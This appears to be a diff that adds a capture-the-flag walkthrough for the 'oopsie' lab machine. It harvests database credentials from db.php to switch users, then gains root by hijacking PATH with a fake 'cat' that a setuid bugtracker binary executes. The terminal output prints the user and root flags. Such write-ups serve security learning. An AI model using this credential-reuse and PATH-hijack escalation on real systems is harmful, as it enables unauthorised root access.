@@ -4037,10 +4037,184 @@ www-data@oopsie:/$
 
 ```
 
+```
+www-data@oopsie:/$ cd var
+
+www-data@oopsie:/var$ ls
+
+backups  crash  local  log   opt  snap   tmp
+cache    lib    lock   mail  run  spool  www
+
+www-data@oopsie:/var$ cd www
+
+www-data@oopsie:/var/www$ ls
+
+html
+
+www-data@oopsie:/var/www$ cd html 
+
+www-data@oopsie:/var/www/html$ ls
+
+cdn-cgi  css  fonts  images  index.php  js  themes  uploads
+
+www-data@oopsie:/var/www/html$ cd cdn-cgi
+
+www-data@oopsie:/var/www/html/cdn-cgi$ ls
+
+login
+
+www-data@oopsie:/var/www/html/cdn-cgi$ cd login
+
+www-data@oopsie:/var/www/html/cdn-cgi/login$ ls
+
+admin.php  db.php  index.php  script.js
+
+cat db.php
+
+<?php
+$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
+?>
+
+```
+ We found a username and password in the db file. 
+
+We can test if it is a valid user login for this machine:
+
+```
+su robert
+Password: M3g4C0rpUs3r!
+
+robert@oopsie:/var/www/html/cdn-cgi/login$ 
+```
+It appears to be a success! Now we can check for our first user flag:
+
+```
+robert@oopsie:/var/www/html/cdn-cgi/login$ cd
+
+robert@oopsie:~$ ls
+
+user.txt
+
+robert@oopsie:~$ cat user.txt
+
+f2c74ee8db7983851ab2a96a44eb7981
+```
+
+
+
+
+Now we can try to advance out privilege to root:
+
+```
+robert@oopsie:~$ sudo -l
+sudo -l
+[sudo] password for robert: M3g4C0rpUs3r!
+
+Sorry, user robert may not run sudo on oopsie.
+```
+```
+robert@oopsie:~$ id
+id
+uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
+robert@oopsie:~$ find / -group bugtracker 2>/dev/null
+find / -group bugtracker 2>/dev/null
+/usr/bin/bugtracker
+robert@oopsie:~$ ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
+ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
+-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
+/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped
+robert@oopsie:~$ /usr/bin/bugtracker
+/usr/bin/bugtracker
+
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: 12
+12
+---------------
+
+cat: /root/reports/12: No such file or directory
+
+
+```
+
+
 
  
- 
- 
+```
+robert@oopsie:~$ cd ..
+cd ..
+robert@oopsie:/home$ ls
+ls
+robert
+robert@oopsie:/home$ cd ..
+cd ..
+robert@oopsie:/$ ls
+ls
+bin    dev   initrd.img      lib64       mnt   root  snap  tmp  vmlinuz
+boot   etc   initrd.img.old  lost+found  opt   run   srv   usr  vmlinuz.old
+cdrom  home  lib             media       proc  sbin  sys   var
+robert@oopsie:/$ cd tmp
+cd tmp
+robert@oopsie:/tmp$ echo '/bin/sh' > cat
+echo '/bin/sh' > cat
+robert@oopsie:/tmp$ ls
+ls
+cat
+robert@oopsie:/tmp$ chmod +x cat 
+chmod +x cat
+
+export PATH=/tmp:$PATH
+$ echo $PATH
+echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+
+robert@oopsie:/tmp$ echo $PATH
+echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+robert@oopsie:/tmp$ bugtracker
+bugtracker
+
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: 2
+2
+---------------
+
+# whoami
+whoami
+root
+# cd
+cd
+# ls
+ls
+user.txt
+# cd ..
+cd ..
+# ls
+ls
+robert
+# cd ..
+cd ..
+# ls
+ls
+bin    dev   initrd.img      lib64       mnt   root  snap  tmp  vmlinuz
+boot   etc   initrd.img.old  lost+found  opt   run   srv   usr  vmlinuz.old
+cdrom  home  lib             media       proc  sbin  sys   var
+# cd root
+cd root
+# ls
+ls
+reports  root.txt
+# cat root.txt
+cat root.txt
+# head root.txt
+head root.txt
+af13b0bee69f8a877c3faf667f7beacf
+```
  
  
  
